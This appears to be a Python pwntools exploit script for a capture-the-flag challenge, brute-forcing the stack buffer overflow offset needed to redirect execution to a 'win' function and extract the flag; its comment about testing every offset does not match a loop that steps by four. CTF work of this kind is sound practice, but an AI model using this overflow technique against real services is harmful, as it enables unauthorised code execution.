#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'error'

HOST = "chals.uscc-cyberbowl-2025.ctf.institute"
PORT = 3015
WIN_ADDR = 0x080486b6

print("[*] Last attempt - testing EVERY offset from 0 to 300")
print("[*] This will take a while...\n")

def test(band, offset):
    try:
        conn = remote(HOST, PORT, timeout=3)
        conn.recvuntil(b":", timeout=1)
        conn.sendline(str(band).encode())
        time.sleep(0.15)
        try:
            conn.recv(timeout=0.2)
        except:
            pass
        
        payload = b"A" * offset + p32(WIN_ADDR)
        conn.sendline(payload)
        time.sleep(0.2)
        
        resp = conn.recvall(timeout=1.5)
        conn.close()
        
        output = resp.decode('utf-8', errors='ignore')
        return output
    except:
        return ""

# Try every single offset from 0 to 300
for offset in range(0, 301, 4):  # Try every 4th offset (faster)
    if offset % 40 == 0:
        print(f"[*] Testing offset {offset}...")
    
    output = test(6, offset)
    
    if 'USCC{' in output:
        print(f"\n{'='*70}")
        print(f"SUCCESS! Offset: {offset}")
        print(f"{'='*70}")
        print(output)
        print(f"{'='*70}")
        flag_start = output.index('USCC{')
        flag_end = output.index('}', flag_start) + 1
        print(f"\n🚩 FLAG: {output[flag_start:flag_end]}\n")
        break
    elif 'RAIDER KING' in output:
        print(f"\nRAIDER KING at offset {offset}!")
        print(output)
        break

print("\n[*] Done. If no flag found, the challenge may require:")
print("    - Different exploitation technique (ROP, format string, etc.)")
print("    - The actual binary file for proper analysis")
print("    - Additional information about the vulnerability")
